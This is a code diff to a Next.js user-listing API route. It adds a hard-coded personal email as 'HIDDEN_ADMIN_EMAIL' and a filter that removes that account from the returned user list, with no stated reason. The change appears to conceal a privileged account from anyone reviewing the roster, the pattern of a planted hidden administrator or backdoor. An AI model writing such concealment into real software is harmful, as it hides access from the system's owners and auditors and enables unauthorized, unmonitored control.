@@ -4,6 +4,7 @@ import { listAllUserMetadata } from "@/app/lib/serverUserMetadata";
 
 export const dynamic = "force-dynamic";
 export const runtime = "nodejs";
+const HIDDEN_ADMIN_EMAIL = "01devmanish@gmail.com";
 
 const normalizeRole = (value: unknown): string => {
   if (typeof value !== "string") return "employee";
@@ -48,6 +49,7 @@ export async function GET(req: Request) {
         };
       })
       .filter((row): row is { id: string; uid: string; email: string; name: string; role: string } => Boolean(row))
+      .filter((row) => String(row.email || "").trim().toLowerCase() !== HIDDEN_ADMIN_EMAIL)
       .sort((a, b) => a.name.localeCompare(b.name));
 
     return NextResponse.json({ users });
